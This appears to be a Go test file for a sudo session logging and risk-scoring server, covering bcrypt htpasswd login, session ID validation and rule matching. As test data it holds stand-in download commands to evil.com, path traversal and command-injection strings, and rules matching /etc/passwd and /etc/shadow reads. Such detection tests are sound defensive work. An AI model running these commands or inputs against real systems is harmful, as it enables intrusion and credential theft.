package main

import (
	"os"
	"path/filepath"
	"testing"

	"golang.org/x/crypto/bcrypt"

	"sudo-logger/internal/store"
)

// ── helpers ───────────────────────────────────────────────────────────────────

func tempHTPasswd(t *testing.T, content string) string {
	t.Helper()
	f, err := os.CreateTemp(t.TempDir(), "htpasswd")
	if err != nil {
		t.Fatalf("create htpasswd: %v", err)
	}
	defer f.Close()
	if _, err := f.WriteString(content); err != nil {
		t.Fatalf("write htpasswd: %v", err)
	}
	return f.Name()
}

func makeBcrypt(t *testing.T, pw string) string {
	t.Helper()
	h, err := bcrypt.GenerateFromPassword([]byte(pw), bcrypt.MinCost)
	if err != nil {
		t.Fatalf("bcrypt: %v", err)
	}
	return string(h)
}

// ── htpasswdStore ─────────────────────────────────────────────────────────────

func TestHTPasswdAuthenticateValid(t *testing.T) {
	hash := makeBcrypt(t, "correct")
	store, err := newHTPasswd(tempHTPasswd(t, "alice:"+hash+"\n"))
	if err != nil {
		t.Fatalf("newHTPasswd: %v", err)
	}
	if !store.authenticate("alice", "correct") {
		t.Error("valid credentials rejected")
	}
}

func TestHTPasswdAuthenticateWrongPassword(t *testing.T) {
	hash := makeBcrypt(t, "correct")
	store, _ := newHTPasswd(tempHTPasswd(t, "alice:"+hash+"\n"))
	if store.authenticate("alice", "wrong") {
		t.Error("wrong password accepted")
	}
}

func TestHTPasswdAuthenticateUnknownUser(t *testing.T) {
	hash := makeBcrypt(t, "pw")
	store, _ := newHTPasswd(tempHTPasswd(t, "alice:"+hash+"\n"))
	if store.authenticate("nobody", "pw") {
		t.Error("unknown user accepted")
	}
}

func TestHTPasswdAuthenticateEmpty(t *testing.T) {
	store, _ := newHTPasswd(tempHTPasswd(t, ""))
	if store.authenticate("", "") {
		t.Error("empty credentials accepted against empty store")
	}
}

func TestHTPasswdMultipleUsers(t *testing.T) {
	h1, h2 := makeBcrypt(t, "pass1"), makeBcrypt(t, "pass2")
	store, err := newHTPasswd(tempHTPasswd(t, "user1:"+h1+"\nuser2:"+h2+"\n"))
	if err != nil {
		t.Fatalf("newHTPasswd: %v", err)
	}
	if !store.authenticate("user1", "pass1") {
		t.Error("user1 rejected")
	}
	if !store.authenticate("user2", "pass2") {
		t.Error("user2 rejected")
	}
	if store.authenticate("user1", "pass2") {
		t.Error("user1 accepted user2's password")
	}
}

func TestHTPasswdCommentsAndBlanks(t *testing.T) {
	hash := makeBcrypt(t, "pw")
	content := "# comment\n\nalice:" + hash + "\n\n# another\n"
	store, err := newHTPasswd(tempHTPasswd(t, content))
	if err != nil {
		t.Fatalf("newHTPasswd: %v", err)
	}
	if !store.authenticate("alice", "pw") {
		t.Error("alice rejected despite valid entry after comments and blanks")
	}
}

func TestHTPasswdRejectNonBcrypt(t *testing.T) {
	// MD5-crypt prefix ($apr1$) must be rejected — only bcrypt ($2b$) is accepted.
	path := tempHTPasswd(t, "alice:$apr1$xyz$deadbeefdeadbeefdeadbeef00\n")
	store, err := newHTPasswd(path)
	if err != nil {
		t.Fatalf("newHTPasswd: %v", err)
	}
	if store.authenticate("alice", "anything") {
		t.Error("non-bcrypt hash should be skipped and authentication denied")
	}
}

func TestHTPasswdReload(t *testing.T) {
	hOld, hNew := makeBcrypt(t, "oldpw"), makeBcrypt(t, "newpw")
	path := tempHTPasswd(t, "alice:"+hOld+"\n")

	store, err := newHTPasswd(path)
	if err != nil {
		t.Fatalf("newHTPasswd: %v", err)
	}
	if !store.authenticate("alice", "oldpw") {
		t.Fatal("setup: oldpw rejected before reload")
	}

	// Rewrite file with new password and an additional user.
	if err := os.WriteFile(path, []byte("alice:"+hNew+"\nbob:"+hOld+"\n"), 0o600); err != nil {
		t.Fatalf("rewrite htpasswd: %v", err)
	}
	if err := store.reload(); err != nil {
		t.Fatalf("reload: %v", err)
	}

	if store.authenticate("alice", "oldpw") {
		t.Error("old password still accepted after reload")
	}
	if !store.authenticate("alice", "newpw") {
		t.Error("new password rejected after reload")
	}
	if !store.authenticate("bob", "oldpw") {
		t.Error("newly added user not available after reload")
	}
}

// ── validateTSID ──────────────────────────────────────────────────────────────

func TestValidateTSIDValid(t *testing.T) {
	cases := []string{
		"alice/host_20260301-120000",
		"bob/server01_20260401-235959",
		"user123/host-name_20260101-000000",
		"alice/host.example_20260301-120000",
	}
	for _, tsid := range cases {
		if err := validateTSID(tsid); err != nil {
			t.Errorf("valid tsid %q rejected: %v", tsid, err)
		}
	}
}

func TestValidateTSIDPathTraversal(t *testing.T) {
	cases := []string{
		"../etc/passwd",
		"alice/../root/secret",
		"../",
	}
	for _, tsid := range cases {
		if err := validateTSID(tsid); err == nil {
			t.Errorf("path traversal tsid %q was not rejected", tsid)
		}
	}
}

func TestValidateTSIDInvalidChars(t *testing.T) {
	cases := []string{
		"alice/host space",
		"alice/host;cmd",
		"alice/host\x00null",
		"alice/host|pipe",
	}
	for _, tsid := range cases {
		if err := validateTSID(tsid); err == nil {
			t.Errorf("tsid with invalid char %q was not rejected", tsid)
		}
	}
}

// ── matchesAll ────────────────────────────────────────────────────────────────

func TestMatchesAll(t *testing.T) {
	s := SessionInfo{
		User:    "alice",
		Host:    "webserver01",
		Command: "/usr/bin/vim /etc/nginx/nginx.conf",
	}

	trueCases := []struct {
		q    string
		desc string
	}{
		{"alice", "user match"},
		{"webserver", "partial host match"},
		{"vim", "command match"},
		{"alice webserver", "AND: both user and host"},
		// Note: case normalisation of the query is done by the HTTP handler
		// (strings.ToLower) before calling matchesAll, not inside matchesAll itself.
		{"nginx", "command path component"},
	}
	for _, c := range trueCases {
		if !matchesAll(s, c.q) {
			t.Errorf("%s: matchesAll(%q) = false, want true", c.desc, c.q)
		}
	}

	falseCases := []struct {
		q    string
		desc string
	}{
		{"alice bob", "AND: bob not in session"},
		{"unknown", "no match anywhere"},
		{"root", "runas not searched"},
	}
	for _, c := range falseCases {
		if matchesAll(s, c.q) {
			t.Errorf("%s: matchesAll(%q) = true, want false", c.desc, c.q)
		}
	}
}

// ── riskLevel ─────────────────────────────────────────────────────────────────

func TestRiskLevel(t *testing.T) {
	cases := []struct {
		score int
		level string
	}{
		{0, "low"},
		{24, "low"},
		{25, "medium"},
		{49, "medium"},
		{50, "high"},
		{74, "high"},
		{75, "critical"},
		{100, "critical"},
	}
	for _, c := range cases {
		if got := store.RiskLevel(c.score); got != c.level {
			t.Errorf("store.RiskLevel(%d) = %q, want %q", c.score, got, c.level)
		}
	}
}

// ── matchPattern ──────────────────────────────────────────────────────────────

func TestMatchPatternContainsAny(t *testing.T) {
	p := &MatchPattern{ContainsAny: []string{"wget", "curl"}}
	if !matchPattern(p, "wget http://evil.com") {
		t.Error("should match wget")
	}
	if !matchPattern(p, "curl http://evil.com") {
		t.Error("should match curl")
	}
	if matchPattern(p, "echo hello") {
		t.Error("should not match unrelated text")
	}
}

func TestMatchPatternAlsoAny(t *testing.T) {
	p := &MatchPattern{
		ContainsAny: []string{"wget", "curl"},
		AlsoAny:     []string{"http://", "ftp://"},
	}
	if !matchPattern(p, "wget http://evil.com") {
		t.Error("should match: wget + http://")
	}
	if matchPattern(p, "wget ./local.sh") {
		t.Error("should not match: wget present but no URL scheme")
	}
}

func TestMatchPatternEmpty(t *testing.T) {
	// A pattern with no conditions matches anything.
	p := &MatchPattern{}
	if !matchPattern(p, "anything") {
		t.Error("empty pattern should match any text")
	}
}

func TestMatchPatternCaseInsensitive(t *testing.T) {
	p := &MatchPattern{ContainsAny: []string{"PASSWD"}}
	if !matchPattern(p, "cat /etc/passwd") {
		t.Error("pattern matching should be case-insensitive")
	}
}

// ── stripANSI ─────────────────────────────────────────────────────────────────

func TestStripANSI(t *testing.T) {
	cases := []struct{ input, want string }{
		{"hello world", "hello world"},
		{"\x1b[1mhello\x1b[0m", "hello"},
		// Escape codes are removed; the styled text itself is preserved.
		{"\x1b[31;1mred bold\x1b[0m text", "red bold text"},
		{"\x1b[2J\x1b[H", ""},
		{"no\x1b[Kescapes", "noescapes"},
	}
	for _, c := range cases {
		got := stripANSI(c.input)
		if got != c.want {
			t.Errorf("stripANSI(%q) = %q, want %q", c.input, got, c.want)
		}
	}
}

// ── scoreSession ──────────────────────────────────────────────────────────────

// makeTestSession creates a minimal session.cast and a corresponding
// SessionInfo for use in scoring tests.  It also initialises the global
// sessionStore so that scoreSession can read from it.
func makeTestSession(t *testing.T, baseDir, command string) (string, *SessionInfo) {
	t.Helper()
	sessDir := filepath.Join(baseDir, "alice", "host_20260101-120000")
	if err := os.MkdirAll(sessDir, 0o755); err != nil {
		t.Fatalf("mkdirall: %v", err)
	}
	hdr := `{"version":2,"width":220,"height":50,"timestamp":1735726800,` +
		`"title":"alice@host: ` + command + `","session_id":"test-sid",` +
		`"user":"alice","host":"host","runas_user":"root","runas_uid":0,"runas_gid":0,` +
		`"cwd":"/home/alice","command":"` + command + `"}` + "\n"
	cast := hdr + "[0.5,\"o\",\"some output\\r\\n\"]\n"
	if err := os.WriteFile(filepath.Join(sessDir, "session.cast"), []byte(cast), 0o644); err != nil {
		t.Fatalf("write cast: %v", err)
	}

	// Point the global store at the test directory so scoreSession can read
	// the cast file and persist the risk cache.
	var err error
	sessionStore, err = store.New(store.Config{Backend: "local", LogDir: baseDir})
	if err != nil {
		t.Fatalf("init test store: %v", err)
	}
	t.Cleanup(func() { sessionStore.Close() })

	s := &SessionInfo{
		TSID:    "alice/host_20260101-120000",
		User:    "alice",
		Host:    "host",
		Runas:   "root",
		Command: command,
	}
	return sessDir, s
}

func TestScoreSessionHighRisk(t *testing.T) {
	dir := t.TempDir()
	_, s := makeTestSession(t, dir, "visudo /etc/sudoers")

	rulesMu.Lock()
	globalRules = []Rule{
		{
			ID:             "visudo",
			Score:          60,
			Reason:         "visudo modifies sudoers",
			CommandBaseAny: []string{"visudo"},
		},
	}
	globalRulesHash = "test-visudo"
	rulesMu.Unlock()

	score, reasons := scoreSession(s)
	if score < 50 {
		t.Errorf("expected score >= 50 for visudo, got %d", score)
	}
	if len(reasons) == 0 {
		t.Error("expected at least one reason for high-risk command")
	}
}

func TestScoreSessionLowRisk(t *testing.T) {
	dir := t.TempDir()
	_, s := makeTestSession(t, dir, "echo hello")

	rulesMu.Lock()
	globalRules = []Rule{
		{
			ID:             "visudo",
			Score:          60,
			Reason:         "visudo modifies sudoers",
			CommandBaseAny: []string{"visudo"},
		},
	}
	globalRulesHash = "test-echo"
	rulesMu.Unlock()

	score, _ := scoreSession(s)
	if score != 0 {
		t.Errorf("expected score 0 for echo, got %d", score)
	}
}

func TestScoreSessionScoreCap(t *testing.T) {
	dir := t.TempDir()
	_, s := makeTestSession(t, dir, "something dangerous")

	rulesMu.Lock()
	globalRules = []Rule{
		{ID: "r1", Score: 60, Reason: "r1", CommandBaseAny: []string{"something"}},
		{ID: "r2", Score: 60, Reason: "r2", Command: &MatchPattern{ContainsAny: []string{"dangerous"}}},
	}
	globalRulesHash = "test-cap"
	rulesMu.Unlock()

	score, _ := scoreSession(s)
	if score > 100 {
		t.Errorf("score %d exceeds cap of 100", score)
	}
}

func TestScoreSessionCachesResult(t *testing.T) {
	dir := t.TempDir()
	_, s := makeTestSession(t, dir, "visudo /etc/sudoers")

	rulesMu.Lock()
	globalRules = []Rule{
		{ID: "visudo", Score: 60, Reason: "visudo", CommandBaseAny: []string{"visudo"}},
	}
	globalRulesHash = "test-cache"
	rulesMu.Unlock()

	score1, reasons1 := scoreSession(s)
	// Second call should return identical results from the on-disk cache.
	score2, reasons2 := scoreSession(s)
	if score1 != score2 {
		t.Errorf("cached score %d != original %d", score2, score1)
	}
	if len(reasons1) != len(reasons2) {
		t.Errorf("cached reasons count %d != original %d", len(reasons2), len(reasons1))
	}
}

func TestScoreSessionIncompleteRule(t *testing.T) {
	dir := t.TempDir()
	sessDir, s := makeTestSession(t, dir, "bash")
	// Mark session as incomplete.
	if err := os.WriteFile(filepath.Join(sessDir, "INCOMPLETE"), nil, 0o644); err != nil {
		t.Fatalf("write INCOMPLETE: %v", err)
	}
	s.Incomplete = true

	incomplete := true
	rulesMu.Lock()
	globalRules = []Rule{
		{ID: "incomplete", Score: 40, Reason: "incomplete session", Incomplete: &incomplete},
	}
	globalRulesHash = "test-incomplete"
	rulesMu.Unlock()

	score, reasons := scoreSession(s)
	if score < 40 {
		t.Errorf("expected score >= 40 for incomplete session, got %d", score)
	}
	if len(reasons) == 0 {
		t.Error("expected reason for incomplete session")
	}
}

func TestScoreSessionContentRule(t *testing.T) {
	dir := t.TempDir()
	sessDir, s := makeTestSession(t, dir, "bash")
	// Append suspicious output event to the cast file.
	shadowContent := "checking /etc/shadow contents\\nalice:$6$hash:19000:0:99999:7:::\\n"
	event := "[1.0,\"o\",\"" + shadowContent + "\"]\n"
	castPath := filepath.Join(sessDir, "session.cast")
	f, err := os.OpenFile(castPath, os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		t.Fatalf("open cast for append: %v", err)
	}
	if _, err := f.WriteString(event); err != nil {
		f.Close()
		t.Fatalf("append event: %v", err)
	}
	f.Close()

	rulesMu.Lock()
	globalRules = []Rule{
		{
			ID:      "shadow_read",
			Score:   50,
			Reason:  "password hash exposed in terminal output",
			Content: &MatchPattern{ContainsAny: []string{"/etc/shadow"}},
		},
	}
	globalRulesHash = "test-content"
	rulesMu.Unlock()

	score, reasons := scoreSession(s)
	if score < 50 {
		t.Errorf("expected score >= 50 for shadow content, got %d", score)
	}
	if len(reasons) == 0 {
		t.Error("expected reason for shadow content match")
	}
}
